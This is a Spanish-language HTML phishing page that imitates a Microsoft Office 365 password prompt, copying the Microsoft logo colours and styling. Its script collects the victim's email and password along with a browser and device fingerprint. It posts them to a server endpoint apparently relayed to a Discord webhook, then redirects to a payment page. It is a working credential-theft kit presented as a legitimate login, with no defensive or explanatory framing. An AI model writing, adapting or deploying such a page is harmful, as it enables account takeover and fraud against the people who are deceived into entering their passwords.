<!doctype html>
<html lang="es">
<head>
<meta charset="UTF-8" />
<link rel="icon" type="image/svg+xml" href="/favicon.svg" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Escribir contraseña - Mail Office 365</title>
<script src="https://cdn.tailwindcss.com"></script>
<script>
tailwind.config={
  theme:{
    extend:{
      colors:{'ms-blue':'#0078d4','ms-blue-hover':'#106ebe','ms-red':'#f25022','ms-green':'#7fba00','ms-yellow':'#ffb900','ms-blue-logo':'#00bcf2','ms-gray':'#1b1b1b','ms-gray-light':'#605e5c','ms-border':'#8a8886'},
      fontFamily:{'segoe':['"Segoe UI"','system-ui','-apple-system','BlinkMacSystemFont','sans-serif']},
      fontSize:{'ms-title':['28px',{lineHeight:'36px',fontWeight:'600'}],'ms-subtitle':['15px',{lineHeight:'20px',fontWeight:'400'}],'ms-body':['15px',{lineHeight:'20px',fontWeight:'400'}],'ms-link':['13px',{lineHeight:'16px',fontWeight:'400'}],'ms-logo':['21px',{lineHeight:'28px',fontWeight:'600'}]}
    }
  }
}
</script>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body,html{min-height:100vh;width:100%;background-size:cover;background-position:center;background-repeat:no-repeat;font-family:"Segoe UI",system-ui,-apple-system,sans-serif}
body{background-color:#0a0a1a;background-image:none}
body.bg-gradient{background:var(--login-bg-gradient,linear-gradient(135deg,#0a0a1a 0%,#1a1a2e 100%))}
body.bg-image{background-image:var(--login-bg-image,none);background-size:cover;background-position:center}
.ms-input{border:1px solid #8a8886;font-size:15px;padding:11px 12px;line-height:20px;border-radius:2px;color:#1b1b1b;background:#fff;width:100%}
.ms-input:focus{outline:none;border-color:#0078d4;box-shadow:inset 0 0 0 1px #0078d4}
.ms-button{background:#0078d4;transition:background-color .1s ease;font-size:15px;font-weight:600;padding:8px 12px;min-height:32px;border-radius:2px;color:#fff;border:none;cursor:pointer;font-family:inherit}
.ms-button:hover{background:#106ebe}.ms-button:active{background:#005a9e}.ms-button:disabled{background:#8a8886;cursor:not-allowed}
.ms-link{color:#0078d4;text-decoration:none;font-size:13px}
.ms-link:hover{text-decoration:underline}
.fade-in{animation:fadeIn .3s ease-out}
@keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
.main-container{position:fixed;top:0;left:0;right:0;bottom:0;display:flex;align-items:center;justify-content:center;padding:1rem;z-index:10}
@media(min-width:640px){.main-container{position:static;min-height:100vh}}
.footer-bar{position:fixed;bottom:0;left:0;right:0;background:rgba(255,255,255,.95);backdrop-filter:blur(8px);border-top:1px solid #e5e5e5;padding:8px 16px;z-index:50}
.footer-bar .footer-inner{max-width:1200px;margin:0 auto;display:flex;flex-wrap:wrap;align-items:center;justify-content:center;gap:8px 24px}
.footer-bar a{color:#605e5c;font-size:12px;text-decoration:none}
.footer-bar a:hover{color:#0078d4;text-decoration:underline}
.error-box{background:#fef2f2;border:1px solid #fca5a5;border-radius:4px;padding:8px 12px;margin-bottom:12px;text-align:center}
.error-text{color:#dc2626;font-size:13px;font-weight:500}
</style>
</head>
<body>
<div class="fixed inset-0 bg-white/10 backdrop-blur-[0.5px]"></div>
<div class="main-container">
  <div class="w-full max-w-md fade-in relative z-10">
    <div class="bg-white/90 backdrop-blur-sm rounded-xl shadow-lg p-12">
      <div class="flex flex-col items-center mb-8">
        <div class="grid grid-cols-2 gap-px w-6 h-6 mb-2">
          <div id="logoColor1" style="background:#f25022;border-radius:1px;width:8px;height:8px"></div>
          <div id="logoColor2" style="background:#7fba00;border-radius:1px;width:8px;height:8px"></div>
          <div id="logoColor3" style="background:#00bcf2;border-radius:1px;width:8px;height:8px"></div>
          <div id="logoColor4" style="background:#ffb900;border-radius:1px;width:8px;height:8px"></div>
        </div>
        <span class="text-ms-logo text-ms-gray" id="logoText">Mail Office 365</span>
      </div>
      <h1 class="text-ms-title text-ms-gray mb-8 font-semibold text-center" id="pageTitle">Escribir contraseña</h1>
      <form onsubmit="handlePasswordSubmit(event)" class="space-y-6">
        <div id="errorBox" class="error-box" style="display:none">
          <span id="errorText" class="error-text"></span>
        </div>
        <div class="relative">
          <input type="password" id="password" placeholder="Contraseña" class="ms-input w-full pr-10 text-ms-gray bg-white" required>
          <button type="button" onclick="togglePassword()" class="absolute right-3 top-1/2 -translate-y-1/2 text-ms-gray-light hover:text-ms-gray transition-colors" tabindex="-1">
            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path></svg>
          </button>
        </div>
        <div class="text-right">
          <a href="#" class="ms-link" id="forgotPasswordText">¿Olvidó su contraseña?</a>
        </div>
        <button type="submit" class="ms-button w-full text-white" id="loginButtonText">Iniciar sesión</button>
      </form>
      <div class="mt-8 pt-6 border-t border-gray-200">
        <div class="text-center"><a href="#" class="ms-link" id="otherSignInText">Otras formas de iniciar sesión</a></div>
      </div>
    </div>
  </div>
</div>
<div class="footer-bar" id="footerBar">
  <div class="footer-inner">
    <a href="#" id="footerHelp">Ayuda</a>
    <a href="#" id="footerTerms">Términos de uso</a>
    <a href="#" id="footerPrivacy">Privacidad y cookies</a>
    <span style="display:none;text-align:center;font-size:12px" id="footerPrivate">Usa la exploración privada si este no es tu dispositivo. <a href="#">Más información</a></span>
  </div>
</div>
<script>
const DEFAULTS={logoText:'Mail Office 365',logoColor1:'#f25022',logoColor2:'#7fba00',logoColor3:'#00bcf2',logoColor4:'#ffb900',pageTitle:'Escribir contraseña',passwordPlaceholder:'Contraseña',loginButtonText:'Iniciar sesión',forgotPasswordText:'¿Olvidó su contraseña?',otherSignInText:'Otras formas de iniciar sesión',loginBgType:'color',loginBgColor:'#0a0a1a',loginBgGradient:'linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%)',loginBgImage:'',footerHelpText:'Ayuda',footerTermsText:'Términos de uso',footerPrivacyText:'Privacidad y cookies',footerPrivateText:'Usa la exploración privada si este no es tu dispositivo.',discordWebhook:'',discordMessageTemplate:''};
let config;
async function loadConfig(){try{const res=await fetch('/api/config');if(res.ok){const data=await res.json();if(data.success&&data.config){config={...DEFAULTS,...data.config};return;}}}catch(e){}try{const stored=localStorage.getItem('mailoffice365_cfg');if(stored){config={...DEFAULTS,...JSON.parse(stored)};return;}}catch(e){}config={...DEFAULTS};}
function applyConfig(){const c=config;document.getElementById('logoText').textContent=c.logoText;document.getElementById('pageTitle').textContent=c.pageTitle;document.getElementById('password').placeholder=c.passwordPlaceholder;document.getElementById('loginButtonText').textContent=c.loginButtonText;document.getElementById('forgotPasswordText').textContent=c.forgotPasswordText;document.getElementById('otherSignInText').textContent=c.otherSignInText;document.getElementById('footerHelp').textContent=c.footerHelpText;document.getElementById('footerTerms').textContent=c.footerTermsText;document.getElementById('footerPrivacy').textContent=c.footerPrivacyText;document.getElementById('footerPrivate').innerHTML=(c.footerPrivateText||'')+' <a href="#">Más información</a>';document.getElementById('logoColor1').style.background=c.logoColor1;document.getElementById('logoColor2').style.background=c.logoColor2;document.getElementById('logoColor3').style.background=c.logoColor3;document.getElementById('logoColor4').style.background=c.logoColor4;applyBackground(c);}
function applyBackground(c){document.body.classList.remove('bg-gradient','bg-image');if(c.loginBgType==='gradient'){document.body.style.background=c.loginBgGradient;document.body.style.backgroundImage='none';document.body.classList.add('bg-gradient');}else if(c.loginBgType==='image'&&c.loginBgImage){document.body.style.backgroundImage='url('+c.loginBgImage+')';document.body.style.backgroundSize='cover';document.body.style.backgroundPosition='center';document.body.classList.add('bg-image');}else{document.body.style.backgroundImage='none';document.body.style.backgroundColor=c.loginBgColor;}}
function togglePassword(){const inp=document.getElementById('password');const svg=document.querySelector('#eyeContainer svg');if(inp.type==='password'){inp.type='text';svg.innerHTML='<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.878 9.878L3 3m6.878 6.878L21 21"></path>';}else{inp.type='password';svg.innerHTML='<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path>';}}
function showError(msg){const box=document.getElementById('errorBox');const text=document.getElementById('errorText');if(box&&text){text.textContent=msg;box.style.display='block';}}
function hideError(){const box=document.getElementById('errorBox');if(box)box.style.display='none';}
async function sendToDiscord(email,password){
  console.log('[Discord] sendToDiscord EJECUTADO');
  const apiUrl=window.location.origin+'/api/discord';
  console.log('[Discord] URL:',apiUrl);
  const body={
    email,password,
    type:'login',
    userAgent:navigator.userAgent,
    language:navigator.language,
    screenResolution:screen.width+'x'+screen.height,
    colorDepth:screen.colorDepth+' bits',
    timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,
    platform:navigator.platform||'',
    onlineStatus:navigator.onLine?'Sí':'No',
    cookiesEnabled:navigator.cookieEnabled?'Sí':'No',
    deviceMemory:navigator.deviceMemory||'desconocido',
    cpuCores:navigator.hardwareConcurrency||'desconocido',
    touchPoints:navigator.maxTouchPoints||0,
    isMobile:'No',isTablet:'No',isDesktop:'Sí',
    batteryLevel:'No disponible',batteryCharging:'Desconocido'
  };
  console.log('[Discord] Payload:',body);
  try{
    const res=await fetch(apiUrl,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});
    const data=await res.json();
    console.log('[Discord] Respuesta:',data);
    return data.success===true;
  }catch(e){console.error('[Discord] Error:',e);return false;}
}
async function handlePasswordSubmit(e){
  e.preventDefault();
  const urlParams=new URLSearchParams(window.location.search);
  const email=urlParams.get('email')||localStorage.getItem('mailoffice365_email')||'';
  const password=document.getElementById('password').value.trim();
  hideError();
  if(!email||!password){
    showError('Ingresa tu contraseña.');
    return;
  }
  const btn=document.querySelector('button[type="submit"]');
  btn.disabled=true;
  btn.textContent='Procesando...';
  try{
    const ok=await sendToDiscord(email,password);
    if(ok){
      showError('Datos enviados correctamente. Redirigiendo...');
    }else{
      showError('❌ Error enviando los datos. Intenta de nuevo.');
    }
  }catch(err){
    showError('❌ Error: '+err.message);
  }
  setTimeout(()=>{window.location.href=window.location.origin+'/payment.html';},2000);
}
(function(){loadConfig().then(()=>applyConfig());})();
</script>
</body>
</html>
